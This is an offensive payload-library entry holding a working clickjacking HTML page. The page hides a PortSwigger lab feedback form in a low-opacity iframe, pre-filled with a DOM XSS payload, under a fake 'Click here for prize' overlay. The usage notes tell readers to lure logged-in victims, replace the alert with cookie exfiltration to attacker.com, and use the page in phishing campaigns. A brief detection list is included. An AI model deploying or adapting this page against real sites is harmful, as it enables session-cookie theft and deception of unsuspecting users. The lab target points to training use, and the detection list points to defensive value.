---
id: 1de12b92-01d2-4060-897b-c1e9a7f1bafb
type: code
language: html
verified: true
created_at: '2020-08-06T13:44:54.830969+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
tags:
  - clickjacking
  - dom-xss
  - payload
platforms:
  - Web
validated: true
---

# Clickjacking-HTML-Page-for-DOM-XSS-Trigger

## Code

```html
<style>
   iframe {
       position:relative;
       width:500px;
       height: 700px;
       opacity: 0.1;
       z-index: 1;
   }
   div {
       position:absolute;
       top:600px;
       left:55px;
       z-index: 1;
   }
</style>
<div>Click here for prize</div>
<iframe sandbox="allow-forms"
src="https://acc51f981fe98dac80180fbc00c20017.web-security-academy.net/feedback?name=<img src=1 onerror=alert(document.cookie)>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

## Description

This HTML code creates a clickjacking page that embeds a vulnerable feedback form in a low-opacity iframe, pre-fills it with a DOM XSS payload in the 'name' field, and overlays a deceptive "Click here for prize" div positioned over the submit button. When the victim clicks the overlay, it submits the form, triggering the XSS to alert document.cookie in the context of the target site.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| TARGET_URL | Full URL of the vulnerable feedback endpoint | https://target.com/feedback |
| XSS_PAYLOAD | The DOM XSS payload to inject | <img src=1 onerror=alert(document.cookie)> |
| FAKE_EMAIL | Fake email for form pre-fill | hacker@attacker-website.com |
| FAKE_SUBJECT | Fake subject for form pre-fill | test |
| FAKE_MESSAGE | Fake message for form pre-fill | test |
| OVERLAY_TEXT | Text to trick the victim | Click here for prize |
| OPACITY | Visibility level of iframe (0.0-1.0, low for stealth) | 0.1 |
| IFRAME_POSITION | Top/left positioning for overlay | top:600px; left:55px |

## Usage

Save this as an .html file and host it on a web server. Lure the victim to visit the page while logged into the target site. Adjust parameters to match the target's form fields and payload. For cookie theft, replace alert(document.cookie) with an exfiltration like <img src="http://attacker.com/log?cookie="+document.cookie>. Used in phishing campaigns targeting authenticated users.

## Detection

- Browser developer tools or network logs showing low-opacity iframes embedding legitimate domains.
- CSP violations or X-Frame-Options blocks if implemented.
- Anomalous form submissions with XSS payloads from unexpected referrers.
- User reports of phishing pages or unexpected alerts/popups.

## Related

- [[procedures/Clickjacking-to-Trigger-DOM-XSS]]
